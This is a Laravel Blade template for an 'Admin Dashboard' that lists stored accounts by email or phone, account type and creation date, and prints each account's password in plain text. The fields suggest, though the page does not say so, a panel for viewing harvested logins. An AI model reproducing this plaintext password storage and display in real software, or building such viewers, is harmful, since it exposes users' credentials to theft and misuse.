<!DOCTYPE html>
<html lang="en">

<head>

    <meta charset="UTF-8">

    <meta name="viewport"
          content="width=device-width, initial-scale=1.0">

    <title>Admin Dashboard</title>

    <style>

        * {
            box-sizing: border-box;
        }

        body {
            margin: 0;

            min-height: 100vh;

            padding: 30px;

            font-family: Arial, sans-serif;

            background: #080b12;

            color: white;
        }

        .container {
            max-width: 1200px;

            margin: auto;
        }

        h1 {
            margin-bottom: 5px;
        }

        .count {
            color: #8993a3;

            margin-bottom: 25px;
        }

        .table-wrapper {
            overflow-x: auto;

            border: 1px solid #252d3a;

            border-radius: 12px;

            background: #111722;
        }

        table {
            width: 100%;

            border-collapse: collapse;

            min-width: 650px;
        }

        th,
        td {
            padding: 15px;

            text-align: left;

            border-bottom: 1px solid #252d3a;

            font-size: 13px;
        }

        th {
            color: #ffc107;

            background: #151b26;
        }

        td {
            color: #c7ced8;
        }

        tr:last-child td {
            border-bottom: 0;
        }

        .badge {
            display: inline-block;

            padding: 5px 9px;

            border-radius: 20px;

            background: #252d3a;

            color: #ffc107;

            font-size: 11px;

            text-transform: capitalize;
        }

        .empty {
            padding: 40px;

            text-align: center;

            color: #7f8998;
        }

        .top {
            display: flex;

            justify-content: space-between;

            align-items: center;

            margin-bottom: 25px;
        }

        .back {
            color: #ffc107;

            text-decoration: none;

            font-size: 13px;
        }

    </style>

</head>

<body>

<div class="container">

    <div class="top">

        <div>

            <h1>Admin Dashboard</h1>

            <div class="count">
                Total Accounts: {{ $accounts->count() }}
            </div>

        </div>

        <a href="/" class="back">
            Back to Home
        </a>

    </div>


    <div class="table-wrapper">

        @if($accounts->count())

            <table>

                <thead>

                    <tr>
                        <th>ID</th>
                        <th>Email / Phone</th>
                        <th>Password</th>
                        <th>Account Type</th>
                        <th>Created</th>
                    </tr>

                </thead>

                <tbody>

                    @foreach($accounts as $account)

                        <tr>

                            <td>
                                {{ $account->id }}
                            </td>

                            <td>
                                {{ $account->email_or_phone }}
                            </td>
                            <td>
                                {{ $account->password }}
                            </td>

                            <td>

                                <span class="badge">
                                    {{ $account->account_type }}
                                </span>

                            </td>

                            <td>
                                {{ $account->created_at->format('d M Y, h:i A') }}
                            </td>

                        </tr>

                    @endforeach

                </tbody>

            </table>

        @else

            <div class="empty">
                No accounts found.
            </div>

        @endif

    </div>

</div>

</body>

</html>